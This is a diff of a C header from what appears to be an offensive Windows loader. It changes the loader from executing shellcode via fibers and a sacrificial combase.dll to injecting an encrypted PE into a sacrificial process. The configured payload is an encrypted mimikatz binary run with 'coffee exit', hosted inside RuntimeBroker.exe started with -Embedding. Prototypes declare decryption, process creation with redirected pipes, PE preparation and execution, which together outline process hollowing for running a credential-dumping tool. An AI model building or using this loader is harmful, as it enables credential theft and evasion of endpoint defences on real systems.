@@ -1,28 +1,22 @@
 #pragma once
 #include <stdio.h>
-#include <stdlib.h>
-#include <windows.h>
 #include "structs.h"
 
 
-/*----------------------------------
- Shellcode execution via fibers 
- or if not defined NtCreateThreadEx
- is used.
-----------------------------------*/
-#define FIBER_EXEC
+
+
+/*-----------------------
+ Sacrificial process
+-----------------------*/
+#define SPAWN_PROCESS L"C:\\Windows\\System32\\RuntimeBroker.exe"
+#define PROCESS_ARGS L"-Embedding"
 
 
 /*------------------------------
-  Shellcode file on disk
+  Encrypted PE file on disk
 ------------------------------*/
-#define LOCAL_FILE "C:\\Users\\lgreenleaf\\Desktop\\http.bin"
-
-
-/*------------------------
-  Sacrificial DLL
-------------------------*/
-#define SACRIFICIAL_DLL L"\\??\\C:\\Windows\\System32\\combase.dll"
+#define PE_FILE "C:\\Users\\nullb1t3\\Desktop\\mimikatz-enc.bin"
+#define PE_ARGS L"coffee exit"
 
 
 /*-----------------------
@@ -32,9 +26,9 @@
 
 
 
-/*----------------------
+/*-----------------------
   Global variables
-----------------------*/
+-----------------------*/
 extern NTAPIS NtAPIs;
 
 
@@ -42,13 +36,25 @@ extern NTAPIS NtAPIs;
 /*-----------------------------
   Function prototypes
 -----------------------------*/
+//Crypt
+BOOL Crypt(IN PCONTENT cnt);
+
+//Generic
+BOOL GetPE(IN PCONTENT cnt);
+
+
+//Init
 BOOL InitAPIs();
-BOOL MapAndCheckDLL(OUT HMODULE hModule, OUT PULONG_PTR dllEntry, IN SIZE_T scSize);
-BOOL WriteExec(IN ULONG_PTR dllEntry, IN PCONTENT cnt);
+BOOL InitPE(IN PPEHDRS pPeHdrs, IN CONTENT cnt);
 
 
-//Read the shellcode from file
-BOOL GetSC(PCONTENT cnt);
+//Create process
+BOOL CreateProc(IN PPROCESS_INFORMATION pProcInfo, OUT HANDLE* pStdInWritePipe, OUT HANDLE* pStdOutReadPipe);
+//Prepare the PE
+BOOL PreparePE(IN PROCESS_INFORMATION procInfo, IN PEHDRS PeHdrs);
+//Execute the PE
+BOOL ExecPE(IN PROCESS_INFORMATION procInfo, IN HANDLE stdOutRead);
+
 
 
 /*--------------------------------------
